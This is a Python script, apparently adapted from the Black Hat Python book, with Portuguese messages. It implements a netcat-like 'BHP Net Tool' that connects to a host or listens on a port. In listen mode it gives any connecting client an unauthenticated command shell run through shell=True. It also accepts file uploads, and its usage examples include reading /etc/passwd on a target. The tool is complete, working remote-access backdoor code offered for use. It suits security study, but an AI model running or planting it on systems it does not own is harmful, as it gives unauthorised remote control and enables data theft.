import argparse
import os
import socket
import subprocess
import sys
import textwrap
import threading


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                response = ""
                while True:
                    data = self.socket.recv(4096)
                    if not data:
                        break
                    response += data.decode()
                    if len(data) < 4096:
                        break

                if not response:
                    print("\nConexão fechada pelo servidor.")
                    break

                print(response, end="")
                buffer = input("> ")
                buffer += "\n"
                self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("\nInterrompido pelo usuário.")
        finally:
            self.socket.close()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f"[*] Ouvindo em {self.args.target}:{self.args.port}")
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def execute(self, cmd):
        cmd = cmd.strip()
        if not cmd:
            return ""

        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            try:
                os.chdir(path)
                return ""
            except Exception as e:
                return f"Falha ao mudar diretório: {str(e)}\n"

        if cmd == "cd":
            return os.getcwd() + "\n"

        try:
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
            return output.decode("utf-8")
        except Exception as e:
            return f"Falha ao executar comando: {str(e)}\n"

    def handle(self, client_socket):
        try:
            if self.args.execute:
                output = self.execute(self.args.execute)
                client_socket.send(output.encode())

            elif self.args.upload:
                file_buffer = b""
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    file_buffer += data

                try:
                    with open(self.args.upload, "wb") as f:
                        f.write(file_buffer)
                    message = f"Arquivo salvo em {self.args.upload}\n"
                except OSError as e:
                    message = f"Falha ao salvar arquivo: {e}\n"
                client_socket.send(message.encode())

            elif self.args.command:
                cmd_buffer = b""
                while True:
                    client_socket.send(b"BHP: #> ")
                    while b"\n" not in cmd_buffer:
                        data = client_socket.recv(64)
                        if not data:
                            break
                        cmd_buffer += data

                    if not cmd_buffer:
                        break

                    response = self.execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b""
        except Exception as e:
            print(f"Erro no handle: {e}")
        finally:
            client_socket.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="BHP Net Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""Exemplo:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # Shell de comando
            netcat.py -t 192.168.1.108 -p 5555 -l -u arquivo.txt # Fazer upload de arquivo
            netcat.py -t 192.168.1.108 -p 5555 -l -e "cat /etc/passwd" # Executa comando no alvo
            netcat.py -t 192.168.1.108 -p 5555 # Conecta com o servidor

            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # Envia texto para alvo na porta 135
            """),
    )

    parser.add_argument("-c", "--command", action="store_true", help="shell de comando")
    parser.add_argument("-e", "--execute", help="executar comando especificado")
    parser.add_argument("-l", "--listen", action="store_true", help="ouvir")
    parser.add_argument(
        "-p", "--port", type=int, default=5555, help="porta especificada"
    )
    parser.add_argument(
        "-t", "--target", default="192.168.1.203", help="IP especificado"
    )
    parser.add_argument("-u", "--upload", help="fazer upload do arquivo")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    if args.listen:
        buffer = b""
    else:
        try:
            buffer = sys.stdin.read().encode()
        except KeyboardInterrupt:
            buffer = b""

    nc = NetCat(args, buffer)
    nc.run()
